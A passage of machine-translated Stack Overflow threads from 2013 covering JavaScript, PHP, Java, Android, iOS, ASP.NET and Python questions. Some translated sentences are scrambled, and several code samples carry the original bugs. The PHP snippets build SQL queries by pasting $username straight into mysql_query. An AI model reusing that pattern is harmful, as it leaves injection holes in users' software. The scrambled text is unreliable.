我想，可能有一些东西可以分成单词左右。我的意思是 gfortran 只计算字符，但 CVF 做了一些不同的事情。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-21T07:41:06.503

如果这是一篇论文练习，有人问我 VAR1、VAR2 和 VAR3 的值是多少，我会给出与 gfortran 相同的结果。

你说的真的很奇怪。我刚刚在 PowerStation4、IVF7（CVF6.6 之前和之后的版本）上尝试过，它们都给出了与 gfortran 相同的结果。我还尝试过使用不同的字对齐方式和不同的数据类型（在 gfortran 中不合法，但您可以在较旧的编译器上执行此操作）并得出相同的答案。

您确定它正在读取您认为正在读取的文件吗？powerstation 和某些版本的 cvf 存在 8.3 文件名问题。他们无法处理长文件名。

# c++ - Union 值的单功能比较

> ID：16091682
> 
> 赞同：0
> 
> 时间：2013-04-18T19:40:58.633
> 
> 标签：c++, unions

我有一个`union`定义如下：

```
union V64
{
    double f64;
    __int64 i64;
    unsigned __int64 u64;
}; 
```

我想对未知类型的 8 字节值与另一个`V64`已知类型的值进行惰性比较（相等和不等）。无论基础类型如何，比较`i64`两个`V64`s 是否会始终如一地给我预期的结果？例如：

```
V64 a.u64 << 9007199254740993+500;  //pseudo-code reading raw bytes
V64 b.u64 << -9007199254740993-501; //pseudo-code reading raw bytes
if(a.i64 > b.i64)
{/*do stuff*/} 
```

比较`u64`在一个为负数`f64`时崩溃，当值超过[`double`'s `int`storage (2^53 +1)](https://stackoverflow.com/questions/1848700/biggest-integer-that-can-be-stored-in-a-double)时比较崩溃。比较`i64`似乎有效，但可能有一个我没有考虑过的情况。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-18T19:44:47.230

分配给相同类型的两个成员后，您可以比较它们：

```
a.f64 = 5.0;
b.f64 = -1.0;

if (a.f64 < b.f64) { /* ... */ } 
```

您只能读取最后写入的工会成员。因此，您可以比较`a.f64`and `c.u64`，但这只会将两个值提升为`double`。

# javascript - 获取 ajax 请求的位置坐标

> ID：16091683
> 
> 赞同：0
> 
> 时间：2013-04-18T19:41:04.153
> 
> 标签：javascript, jquery, ajax, location, coords

目前正在为 iOS 开发一个天气网络应用程序。我正在尝试获取用户的坐标并将纬度和经度放在我的 Ajax 请求中（在 api Wunderground 上）。

这是我的代码（编辑）：

```
<script type="text/javascript">
       $(document).ready(function() {

       navigator.geolocation.getCurrentPosition(getLocation, unknownLocation);

         function getLocation(pos)
         {
           var lat = pos.coords.latitude;
           var lon = pos.coords.longitude;

            $.ajax({
                     url : "http://api.wunderground.com/api/ApiId/geolookup/conditions/q/"+ lat +","+ lon +".json",
                     dataType : "jsonp",

                     success : function(parsed_json) {
                        var location = parsed_json['location']['city'];
                        var temp_f = parsed_json['current_observation']['temp_f'];
                        alert("Current temperature in " + location + " is: " + temp_f);
                     }
                  });
         }
         function unknownLocation()
         {
           alert('Could not find location');
         }
       });
    </script> 
```

如您所见，我“简单地”必须创建 2 个 lat 和 lon 变量并将它们添加到我的请求中。我尝试了很多变体，但我无法让这段代码正常工作。

知道我做错了什么吗？

非常感谢 ！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-18T20:52:34.123

您的变量声明位于 .ajax 调用的中间，并使 JavaScript 结构无效。另外，我不确定你为什么使用“function($)”，通常使用 jQuery，$ 是保留的，不应该用作函数参数。

```
 <script type="text/javascript">
$(document).ready(function() {
    navigator.geolocation.getCurrentPosition(onPositionUpdate);
});

function onPositionUpdate(position) {
    var lat = position.coords.latitude;
    var lon = position.coords.longitude;
    $.ajax({
        url : "http://api.wunderground.com/api/ApiId/geolookup/conditions/q/"+lat+","+lon+".json",
        dataType : "jsonp",
        success : function(parsed_json) {
            var location = parsed_json['location']['city'];
            var temp_f = parsed_json['current_observation']['temp_f'];
            alert("Current temperature in " + location + " is: " + temp_f);
        }
    });
}
</script> 
```

# asp.net - ScriptManager.RegisterStartUpScript(...) 不工作

> ID：16091684
> 
> 赞同：3
> 
> 时间：2013-04-18T19:41:05.017
> 
> 标签：asp.net, scriptmanager

自从我在 Event 上开始我的新项目以来，我一直使用此命令`ImageButton_Click`，并且它在我使用的每个页面中都运行良好：我首先检查是否有一个字段为空，如果是，然后我发送 this `alert`。

```
ScriptManager.RegisterStartupScript(this, typeof(Page), "alert", "alert('No Empty fields are allowed.');", true); 
```

我在这里做什么：我有 2`textboxes`输入两个日期，这些日期用于填充我的`reportviewer`，但在它进入 之前`reportviewer`，我检查它是否是`empty`。

在此页面中，它仅在我第一次按下按钮时起作用。我使用了断点，它通过`OK`了我的条件`IF`，但它没有显示消息......为什么？
完整代码`Button_Click Event`：

```
 if (Txt_Dt_Final.Text == "" || Txt_Dt_Inicial.Text == "")
     {
        ScriptManager.RegisterStartupScript(this, typeof(Page), "alert", "alert('No Empty fields are allowed.');", true);
        Txt_Dt_Inicial.Focus();
        return;
     } 
```

**更新**
实际上，在我第一次按下它之后，什么都没有了......即使我输入了一个有效的日期，它也不起作用......我现在测试了它，只有在第一次出现错误时才会出现错误按下按钮的时间。
例如：
如果我键入日期确定，那么我的reportviewer 将返回我的报告结果...然后我单击带有空文本框的按钮，它将触发错误并向我显示消息。如果我再次按下它会正常工作！

现在，如果我第一次按下带有空字段的按钮，该按钮将不再起作用！如果我刷新页面，它就会恢复工作......为什么？oO
我所有其他页面都运行良好。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-19T05:44:12.860

除非您在更新面板中有 ASP 控件，否则您的代码应该可以工作。如果您这样做，请改用它。

```
ScriptManager.RegisterStartupScript(updatePanel,updatePanel.GetType()
                                                  , "alert", javaScript, true); 
```

# jquery - 添加另一个 div 会动态地将先前 div 的所有滚动向上推

> ID：16091685
> 
> 赞同：0
> 
> 时间：2013-04-18T19:41:06.340
> 
> 标签：jquery, html, scrollbar

我的 html 看起来像这样：

```
<div id="main">
  <div style="height:200px; width:100px; overflow:scroll; display:inline-block;">
    hi<br/>  hi<br/>  hi<br/>  hi<br/>  hi<br/>  hi<br/>  hi<br/>  hi<br/>  hi<br/>  hi<br/>  hi<br/>  hi<br/>  hi<br/>  hi<br/>  hi<br/>  hi<br/>  hi<br/>  hi<br/>  hi<br/>
  </div>
</div>
<input type="submit" id="clickme" /> 
```

我的jQuery看起来像这样：

```
$('#clickme').on('click', function()
{ 
    $('#main').html($('#main').html() + '<div style="height:200px; width:100px; overflow:scroll; display:inline-block;"> hi<br/>  hi<br/>  hi<br/>  hi<br/>  hi<br/>  hi<br/>  hi<br/>  hi<br/>  hi<br/>  hi<br/>  hi<br/>  hi<br/>  hi<br/>  hi<br/>  hi<br/>  hi<br/>  hi<br/>  hi<br/>  hi<br/></div>');  
}); 
```

这是一个活生生的[例子](http://codepen.io/anon/pen/egcux)。

当我向下滚动第一个 div 并单击提交时，它应该在其右侧添加另一个 div 但不向上滚动第一个 div。我花了很长时间才意识到问题所在，所以我想我会分享它。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-18T19:41:06.340

解决方案很简单。我以错误的方式将控件添加到 html 中。我应该使用`insertAfter`jquery 中的函数来完成它，如下所示：

```
$('#clickme').on('click', function()
{
    $('<div style="height:200px; width:100px; overflow:scroll; display:inline-block;">   hi<br/>  hi<br/>  hi<br/>  hi<br/>  hi<br/>  hi<br/>  hi<br/>  hi<br/>  hi<br/>  hi<br/>  hi<br/>  hi<br/>  hi<br/>  hi<br/>  hi<br/>  hi<br/>  hi<br/>  hi<br/>  hi<br/>  </div>')
    .insertAfter($('#main').children().last());  
}); 
```

如这个[链接](http://codepen.io/anon/pen/lrqyz)所示。

# python - 完成功能如何在 readline 中工作

> ID：16091689
> 
> 赞同：0
> 
> 时间：2013-04-18T19:41:13.960
> 
> 标签：python, autocomplete, readline

我检查了一些例子，包括

[http://pymotw.com/2/readline/](http://pymotw.com/2/readline/)

```
class SimpleCompleter(object):

    def __init__(self, options):
        self.options = sorted(options)
        return

    def complete(self, text, state):
        response = None
        if state == 0:
            # This is the first time for this text, so build a match list.
            if text:
                self.matches = [s 
                                for s in self.options
                                if s and s.startswith(text)]
                logging.debug('%s matches: %s', repr(text), self.matches)
            else:
                self.matches = self.options[:]
                logging.debug('(empty input) matches: %s', self.matches)

        # Return the state'th item from the match list,
        # if we have that many.
        try:
            response = self.matches[state]
        except IndexError:
            response = None
        logging.debug('complete(%s, %s) => %s', 
                      repr(text), state, repr(response))
        return response 
```

我无法弄清楚为什么状态会增加以及它的目的是什么。对于 state=0 和匹配单词的一个元素列表，它可以正常工作，但是当状态增加时，我会引发错误（IndexError）

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-09-09T15:00:22.547

*state*是可能匹配的数量，您可以使用它来返回多个结果。即当`state == 1`返回“cmd1”时，当`state == 2`返回“command2”时，当`state == 3`返回 None 时传递一个 2 匹配结果。

# php - 使用 javascript/JQuery 传递 2 个 php 变量

> ID：16091693
> 
> 赞同：0
> 
> 时间：2013-04-18T19:41:23.920
> 
> 标签：php, javascript, jquery, variables

我有一个 Jquery 代码，它监听用户的选择并显示用户需要的信息。用户选择一个“文件夹”，然后在他们选择后显示内容。

有2页。第一页有 jquery 代码和选择框以及显示信息的 div。我们的问题是我得到了要传递的文件夹名称，但我还需要传递 $username 以便它知道哪些文件夹去查查看。

这是第一页。它是选择框，也是 jquery 代码。

```
<script type="text/javascript" src="jquery-1.9.1.min.js">
</script>

<script type="text/javascript">
$(document).ready(function () {
    $("#theselect").change(function() {
var option = $(this).val();
        $.get("selectfolders.php", {select:option},function(data){
            $("#theresult").html(data).hide().fadeIn(1000);
        });
    });
});
</script>

echo "
<select name='thename' id='thename' style='visibility:hidden;' >
<option value='$username'>$username</option>
</select>";
?>
<select name="theselect" id="theselect">
<option value="">Select</option>
<?
$thelistquery = mysql_query("SELECT * FROM folders WHERE username='$username'");
while ($lrows = mysql_fetch_array($thelistquery)) {
$id = $lrows['ID'];
$username = $lrows['username'];
$foldername = $lrows['foldername'];
$newfoldername = mysql_real_escape_string($foldername);

echo "<option value='$newfoldername'>$newfoldername</option>";
}
?>
</select> 
```

这是第二页。它生成文件夹列表并在第一页显示用户选择的文件夹：

```
$thelistquery = mysql_query("SELECT * FROM folders WHERE username='$username'");
while ($lrows = mysql_fetch_array($thelistquery)) {
$id = $lrows['ID'];
$username = $lrows['username'];
$foldername = $lrows['foldername'];
$newfoldername = mysql_real_escape_string($foldername);

if($_GET['select'] == '$newfoldername') {
echo "This is the $newfoldername folder.";
}
} 
```

我们需要在 javascript 中添加代码以从第一页获取 $username 并将其传递到第二页，以便它知道要查找的文件夹。有什么帮助吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-18T19:45:35.643

```
$.get("selectfolders.php", {select:option, username:username},function(data){}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-18T20:27:09.640

我遇到了类似的问题，这就是我解决它的方法：

```
 $("#theselect").change(function() {
    var option = $(this).val();
    var selectedUser = $("#thename").val();
    $.get("selectfolders.php", {select:option,username:selectedUser},function(data){
        $("#theresult").html(data).hide().fadeIn(1000);
    });
 }); 
```

为此，请确保在将“选定”HTML 属性添加到选项时选择了用户名。但是我认为如果您只使用隐藏块会更容易：

```
<input type="hidden" value="$username" name="username" id="username" > 
```

# ios - 2 个 UIButtons 来设置 2 个 UIImageViews

> ID：16091696
> 
> 赞同：0
> 
> 时间：2013-04-18T19:41:36.907
> 
> 标签：ios, objective-c, uiimageview, uibutton

我有 2`UIButton`秒，我希望两个按钮都可以选择图像，`button1`正在将图像设置为`imageview1`和。我现在创建了它选择一个图像并设置为该图像，但是如果我正在创建，我现在不需要做什么：`button2``imageView2``button1``imageView1``button2`

```
- (IBAction)chooseImage1:(id)sender {
     imagePicker.delegate = self;
     imagePicker.sourceType = UIImagePickerControllerSourceTypePhotoLibrary;
     [self presentViewController:imagePicker animated:YES completion:nil];
}

- (IBAction)chooseImage2:(id)sender {
     imagePicker.delegate = self;
     imagePicker.sourceType = UIImagePickerControllerSourceTypePhotoLibrary;
     [self presentViewController:imagePicker animated:YES completion:nil];
}

UIImage *image;

-(void)imagePickerController:(UIImagePickerController *)picker didFinishPickingMediaWithInfo:(NSDictionary *)info {

      NSURL *mediaURL;
      mediaURL = (NSURL *)[info valueForKey:UIImagePickerControllerMediaURL];
      image = (UIImage *)[info valueForKey:UIImagePickerControllerOriginalImage];

     imageView1.image=image;
     [picker dismissViewControllerAnimated:YES completion:nil];
}

-(void)imagePickerControllerDidCancel:(UIImagePickerController *)picker {
     [picker dismissViewControllerAnimated:YES completion:nil];
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-18T19:48:32.790

`.h`在您的文件中创建索引。就像是

```
NSUInteger *selectedImageIndex; 
```

在你的`.m`文件中：

```
- (void)showImagePicker:(UIImagePickerControllerSourceType)source{
    UIImagePickerController *ipc = [[UIImagePickerController alloc] init];
    ipc.sourceType = source;
    ipc.allowsEditing = YES;
    ipc.delegate = self;
    [self presentModalViewController:ipc animated:YES];
}

- (IBAction)chooseImage1:(id)sender {
    selectedImageIndex = 1;
    [self showImagePicker:UIImagePickerControllerSourceTypePhotoLibrary];
}

- (IBAction)chooseImage2:(id)sender {
    selectedImageIndex = 2;
    [self showImagePicker:UIImagePickerControllerSourceTypePhotoLibrary];
}    

-(void)imagePickerController:(UIImagePickerController *)picker didFinishPickingMediaWithInfo:(NSDictionary *)info {
        UIImage *img = [info objectForKey:@"UIImagePickerControllerEditedImage"];
        if (!img)
           img = [info objectForKey:@"UIImagePickerControllerOriginalImage"];

        if (selectedImageIndex == 1)
           imageView1.image=img;
        else
           imageView2.image = img;

        [picker dismissViewControllerAnimated:YES completion:nil];
}

-(void)imagePickerControllerDidCancel:(UIImagePickerController *)picker {
       [picker dismissViewControllerAnimated:YES completion:nil];
} 
```

但话又说回来，这只是一种方法。

# javascript - html5 canvas - touchmove - 如何计算速度和方向？

> ID：16091701
> 
> 赞同：1
> 
> 时间：2013-04-18T19:41:49.720
> 
> 标签：javascript, html5-canvas, touchmove

所以我想测量用户在 html5 画布上滑动的速度和方向？

似乎应该已经写了一些东西来做到这一点，所以我不必重新发明轮子，但我找不到任何东西。有人知道 JavaScript 函数吗？

如果我必须自己做，我在想：

*   抓取触摸事件 x 和 y，将它们存储在数组变量中
*   计算2点之间的斜率（如果斜率不同，可能会平均）
*   不知道如何测量速度，也许是点之间的距离？

还有其他想法吗？

这是我的画布和我的形状，它监听触摸事件。当触摸我的 iphone 或 iphone 模拟器时，我通常会收到 1 或 2 个事件。我看坐标。我正在使用 kineticjs 作为舞台和形状。

要尝试它，请在您的 iPhone 中访问此 url，然后将手指放在圆圈上并将其推到某个地方。（或者如果你有 ios 模拟器，你也可以使用它）

这是我的小提琴：http: [//jsfiddle.net/jnylund/uRgZZ/16/](http://jsfiddle.net/jnylund/uRgZZ/16/)

```
 function writeMessage(messageLayer, message) {
   var context = messageLayer.getContext();
   messageLayer.clear();
   context.font = '18pt Calibri';
   context.fillStyle = 'black';
   context.fillText(message, 10, 25);
   var div = document.getElementById('tevents');
   div.innerHTML = div.innerHTML + message + "<BR/>";

}

var stage = new Kinetic.Stage({
   container: 'container',
   width: 460,
   height: 320
});

var layer = new Kinetic.Layer();
var messageLayer = new Kinetic.Layer();

var circle = new Kinetic.Circle({
   x: stage.getWidth() / 2,
   y: stage.getHeight() / 2,
   radius: 40,
   fill: 'red',
   stroke: 'black',
   strokeWidth: 4 //,
   // draggable: true
});

circle.setX(230);
circle.setY(160);

circle.on('touchmove', function (event) {
   writeMessage(messageLayer, 'touch event length is ' + event.touches.length);
   for (var i = 0; i < event.touches.length; i++) {
       var touch = event.touches[i];
       writeMessage(messageLayer, 'event x: ' + touch.pageX + ', y: ' + touch.pageX);
   }

   var touchPos = stage.getTouchPosition();
   writeMessage(messageLayer, 'stage x: ' + touchPos.x + ', y: ' + touchPos.y);

});

// add the shape to the layer
layer.add(circle);

// add the layer to the stage
stage.add(layer);
stage.add(messageLayer); 
```

谢谢乔尔

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-04-19T09:37:38.620

您可以通过以下步骤简单地做到这一点：

*   触地，存储时间和位置
*   修饰，存储时间和位置

在与 touch up 相同的处理程序中继续执行以下步骤：

*   结束时间减去开始时间
*   计算[起点和终点之间的距离](http://www.mathwarehouse.com/algebra/distance_formula/)
*   计算[起点和终点之间的角度](https://stackoverflow.com/questions/7586063/how-to-calculate-the-angle-between-two-points-relative-to-the-horizontal-axis)

要获得与您相关的因素，请按时差划分距离。值越高，速度越快。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-18T19:44:15.307

可以通过多种方式测量速度：

*   [初始点和最终点之间的时间戳](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Date/now)，以每毫秒像素为单位。
*   帧速率，对于固定速率，以每帧像素或每秒像素为单位测量。

然后将值转换为您的应用程序中使用的比例，例如赛车的 kph 或 mph。

# java - Android Scrollable Tabs + 滑动时的滑动状态

> ID：16091704
> 
> 赞同：4
> 
> 时间：2013-04-18T19:41:59.780
> 
> 标签：java, android, android-viewpager, swipe, android-tabs

我正在尝试使用多个选项卡制作应用程序。对于每个选项卡，我使用不同的片段。当我浏览标签时，它们中的信息正在发生变化。

滑动时如何保存每个选项卡的状态？

代码例如：

**MainActivity.java**：

```
package com.tabs.example;

import java.util.Locale;

import android.graphics.Color;
import android.os.Bundle;
import android.support.v4.app.Fragment;
import android.support.v4.app.FragmentActivity;
import android.support.v4.app.FragmentManager;
import android.support.v4.app.FragmentPagerAdapter;
import android.support.v4.view.PagerTabStrip;
import android.support.v4.view.ViewPager;

public class MainActivity extends FragmentActivity {

    SectionsPagerAdapter mSectionsPagerAdapter;
    ViewPager            mViewPager;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        mSectionsPagerAdapter = new SectionsPagerAdapter(getSupportFragmentManager());

        mViewPager = (ViewPager) findViewById(R.id.pager);
        mViewPager.setAdapter(mSectionsPagerAdapter);

        PagerTabStrip pagerTabStrip = (PagerTabStrip) findViewById(R.id.pager_tab_strip);
        pagerTabStrip.setBackgroundColor(Color.BLACK);
        pagerTabStrip.setTabIndicatorColor(Color.CYAN);
        pagerTabStrip.setTextColor(Color.WHITE);
    }

    public class SectionsPagerAdapter extends FragmentPagerAdapter {

        public SectionsPagerAdapter(FragmentManager fm) {
            super(fm);
        }

        @Override
        public Fragment getItem(int position) {

            Fragment fragment;
            switch (position) {
                case 0:
                    fragment = new Fragment1();
                    break;
                case 1:
                    fragment = new Fragment2();
                    break;
                case 2:
                    fragment = new Fragment3();
                    break;
                default:
                    fragment  = null;
                    break;
            }
            return fragment;

        }

        @Override
        public int getCount() {
            return 3;
        }

        @Override
        public CharSequence getPageTitle(int position) {
            Locale l = Locale.getDefault();
            switch (position) {
                case 0:
                    return getString(R.string.title_section1).toUpperCase(l);
                case 1:
                    return getString(R.string.title_section2).toUpperCase(l);
                case 2:
                    return getString(R.string.title_section3).toUpperCase(l);
            }
            return null;
        }
    }
} 
```

**片段1.java**：

```
package com.tabs.example;

import android.os.Bundle;
import android.support.v4.app.Fragment;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.TextView;

import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;

public class Fragment1 extends Fragment {

    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {

        View root = inflater.inflate(R.layout.fragment1, container, false);

        DateFormat dateFormat = new SimpleDateFormat("HH:mm:ss");
        Date date = new Date();
        String time = dateFormat.format(date);

        TextView tv1 = (TextView) root.findViewById(R.id.tv1);
        tv1.setText(time);

        return root;

    }
} 
```

**片段2.java**：

```
package com.tabs.example;

import android.os.Bundle;
import android.support.v4.app.Fragment;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.TextView;

import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;

public class Fragment2 extends Fragment {

    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {

        View root = inflater.inflate(R.layout.fragment2, container, false);

        DateFormat dateFormat = new SimpleDateFormat("HH:mm:ss");
        Date date = new Date();
        String time = dateFormat.format(date);

        TextView tv2 = (TextView) root.findViewById(R.id.tv2);
        tv2.setText(time);

        return root;

    }
} 
```

**片段3.java**：

```
package com.tabs.example;

import android.os.Bundle;
import android.support.v4.app.Fragment;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.TextView;

import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;

public class Fragment3 extends Fragment {

    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {

        View root = inflater.inflate(R.layout.fragment3, container, false);

        DateFormat dateFormat = new SimpleDateFormat("HH:mm:ss");
        Date date = new Date();
        String time = dateFormat.format(date);

        TextView tv3 = (TextView) root.findViewById(R.id.tv3);
        tv1.setText(time);

        return root;

    }
} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-19T21:07:11.073

您可以通过像这样设置 ViewPagerAdapter 来缓存它们：

```
mViewPager.setOffscreenPageLimit(3); 
```

# java - 按下按钮作为热键

> ID：16091705
> 
> 赞同：2
> 
> 时间：2013-04-18T19:42:14.693
> 
> 标签：java

我正在尝试制作类似热键文本框的东西。用户按下`F11`/ `Caps lock`/ 任意键，它就会出现在框中。我是这样做的：

```
@Override
public void keyPressed(KeyEvent e) {
    textField_1.setText(String.valueOf(e.getKeyChar()));
} 
```

但它不适用于 Fs、大写锁定等（很明显，因为这些不是字符）。我该如何处理这个问题？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-18T19:45:42.833

您可以使用：

```
event.getKeyCode(); 
```

但总的来说，您可能应该使用[Key Bindings](http://docs.oracle.com/javase/tutorial/uiswing/misc/keybinding.html)。

正如 Agusti-N 在[他的回答](https://stackoverflow.com/questions/3355574/java-swing-keylistener/3355666#3355666)中所说：

> 该接口`KeyListener`包含三个方法：
> 
> ```
> void keyTyped(KeyEvent)
> void keyPressed(KeyEvent)
> void keyReleased(KeyEvent) 
> ```

如果您使用`keyPressed`并且正在使用`event.getKeyChar()`来检查输入的字符，这将不起作用。你应该使用`getKeyChar()`for`keyTyped`和`getKeyCode()`for`keyPressed`和`keyReleased`。否则你会得到`null`. 如[javadoc](http://docs.oracle.com/javase/7/docs/api/java/awt/event/KeyEvent.html#getKeyChar%28%29)中所述。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-18T19:50:02.417

如果按下键，您可能想要使用`e.getKeyText()`而不是`e.getKeyChar()`返回。以下是 API 说明：`F1``F1`

> **获取密钥文本**
> 
> **公共静态字符串 getKeyText(int keyCode)**
> 
> 返回描述 keyCode 的字符串，例如“HOME”、“F1”或“A”。这些字符串可以通过更改 awt.properties 文件进行本地化。
> 
> **返回：**包含物理键的文本描述的字符串，由其 keyCode 标识

-- [http://docs.oracle.com/javase/6/docs/api/java/awt/event/KeyEvent.html#getKeyText(int)](http://docs.oracle.com/javase/6/docs/api/java/awt/event/KeyEvent.html#getKeyText(int))

**或者：**

您还可以使用`e.getKeyCode`它将为您提供各种关键事件的关键代码，识别它们相应的常量值。例如， e.getKeyCode 将`112`作为按键的值返回`F1`，可以通过常量访问`VK_F1`。以下是 API 说明：

> **获取密钥代码**
> 
> **public int getKeyCode()**
> 返回与此事件中的键关联的整数 keyCode。
> **返回：**键盘上实际按键的整数代码。（对于 KEY_TYPED 事件，keyCode 是 VK_UNDEFINED。）

-- [http://docs.oracle.com/javase/6/docs/api/java/awt/event/KeyEvent.html#getKeyCode()](http://docs.oracle.com/javase/6/docs/api/java/awt/event/KeyEvent.html#getKeyCode())

以下是关键常量的列表：http: [//docs.oracle.com/javase/6/docs/api/constant-values.html#java.awt.event.KeyEvent.CHAR_UNDEFINED](http://docs.oracle.com/javase/6/docs/api/constant-values.html#java.awt.event.KeyEvent.CHAR_UNDEFINED)

# java - 如何将逻辑排除在 JSP 之外？

> ID：16091711
> 
> 赞同：5
> 
> 时间：2013-04-18T19:42:55.053
> 
> 标签：java, jsp

我需要在 JSP 中建立一个表。我有一个带有一堆 bean 的数组列表，这些 bean 是由结果集制成的，只是从 DB 调用返回的行中。

根据数据，我想展示不同的东西。一个例子是，如果 bean 中的名称以“a”开头，则突出显示该名称，如果它以“b”开头，则将名称设为红色但不突出显示（我认为这涵盖了我的问题/情况）。

如果我在 JSP 中没有逻辑，我将如何控制它？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-18T19:47:14.150

一种方法是编写一个存在于 bean 类中的函数，或者更准确地说是在 bean 类的包装器中：

```
public class BeanFormatter {

  private Bean bean;

  public BeanFormatter(Bean myDataBean) {
    this.bean = myDataBean;
  }

  public String getFormattedHTML() {
    //put your logic here. Return the necessary HTML based on the bean.
  }
} 
```

您想要返回的可能不是字符串格式的 HTML，而是用于包装数据的 div 名称或其他 css 类。但您可以编写另一种方法，例如`getDisplayCSSClass()`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-18T20:30:23.140

如果您需要查看某些特殊行为，并且想要保持干净的 JSP，您应该考虑创建新标签。您应该知道有几种不同的标签。而且因为您的标签负责创建可视组件，所以我建议使用标签文件。

查看本[教程](http://docs.oracle.com/javaee/1.4/tutorial/doc/JSPTags5.html)以了解其工作原理。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-18T20:40:53.587

**实际上，你在逻辑**这个词下是什么意思？您所描述的事情涉及显示逻辑，可以将这种逻辑放入jsp文件中。大多数 JSTL 标记都是为这项工作而设计的。如果您的意思是业务逻辑，Java 类（ejb、spring bean 或简单类）是其在良好设计中的唯一位置（即使不是在更适合控制逻辑的 servlet/控制器中）

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-18T19:48:26.987

您可以创建一个“翻译器”对象，该对象具有一个（或多个）采用 bean 的方法，并返回格式化的 HTML。

# php - 客户端-服务器 PHP 通信

> ID：16091717
> 
> 赞同：0
> 
> 时间：2013-04-18T19:43:10.270
> 
> 标签：php, webserver

PHP 服务器页面如何处理来自不同用户的多个请求？

我习惯了类 C 语言，他们使用多线程。在这种情况下 PHP 使用什么？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-18T19:47:16.883

PHP 解释器通常由网络服务器（如 apache、lighthttpd、...）调用。然后网络服务器处理请求（通过线程、分叉或其他方式）。PHP 的每个实例都是按顺序运行的，因此没有内置的多线程。

存在一个 PECL 扩展[https://github.com/krakjoe/pthreads](https://github.com/krakjoe/pthreads)，它为 PHP 添加了多线程。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-18T19:48:55.310

这实际上取决于您用来处理这些请求的服务器。PHP 本身不处理请求，而是用于解析脚本并返回结果。可以用 PHP 编写 Web 服务器，但话又说回来，这完全取决于您使用的服务器。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-18T19:49:02.033

这实际上是一个很好的问题。一旦多个用户尝试向同一服务器发送请求，就不会发生冲突，因为网络服务器会创建一个独立的进程，您可以为每个请求调用它自己的会话（而不是 php 会话）。PHP 与此无关，因为它只是一个最终由机器翻译的脚本。

# jquery - 如何删除 AJAX XML 响应的外部元素

> ID：16091718
> 
> 赞同：1
> 
> 时间：2013-04-18T19:43:13.260
> 
> 标签：jquery, xml, dom

场景：我希望通过 AJAX 将元素列表返回给浏览器。使用 JAXB 进行编组，并且由于 XML 需要根元素（JSON 不需要...），我将列表包装在信封（包装器）元素中。现在在客户端（浏览器）上，我希望删除外部元素，使内部元素列表保持不变。然后我希望将提取的元素列表放入 HTML Dom。我怎样才能做到这一点？

澄清示例：

想寄：

```
<tr><td>data</td></tr><tr><td>data</td></tr> 
```

由于对 text/xml 响应类型的限制（为了符合 XML），我将其包装为：

```
<tbody><tr><td>data</td></tr><tr><td>data</td></tr></tbody> 
```

因此，在我的 jquery 回调方法中，我收到了上述内容（作为 xml 对象）。我怎样才能（没有特定的顺序，除了任何工作）删除 tbody 元素，并确保剩余的 tr 标签是可接受的 domData。我玩过 find()、filter() 等，但仍然没有解决这两个要求的解决方案。

感谢所有已经回复的人！这个真的让我很困扰。如果不测试所有提供的答案，似乎有多种方法可以做到这一点，并且每个答案都可能被标记为正确的答案。我实际上是这样做的：

```
 }).done(function(xmlResponse) {
    $strData = xmlToString(xmlResponse);
    $html = $($strData);
    $('#mytable tbody').html($html.contents());
 }); 
```

出于某种原因，如果没有首先将 xml 转换为字符串的显式标注，它就不起作用。此后，将字符串包装在 $() 中强制它符合 DOM，然后 contents() 方法负责提取（删除）外部元素。

这是 xmlToString() 方法。如果有人能指出我如何消除对这种丑陋方法的需求，那肯定是一个奖励。它看起来像是 2009 年之前的 html 应用程序：

```
function xmlToString(xmlData) { 
  var xmlString;
  if (window.ActiveXObject){
     xmlString = xmlData.xml;
  } else{
     xmlString = (new XMLSerializer()).serializeToString(xmlData);
  }
  return xmlString;
} 
```

我会将我读到的第一个答案标记为正确，因为它足以让我越过终点线。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-18T19:49:37.683

您可以使用[`replaceWith`](http://api.jquery.com/replaceWith/)它的孩子来替换它（这将保留它们）：

```
$(xml).children("tbody").replaceWith($(xml).children("tbody").children()); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-18T19:49:51.660

您可以只使用`.contents()`来提取根元素的内容：

```
$html = $('<tbody><tr><td>data</td></tr><tr><td>data</td></tr></tbody>');
$html.contents().appendTo('#something-else'); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-18T19:44:28.477

尝试这个 -

```
$(xml).find('tbody').contents().unwrap(); 
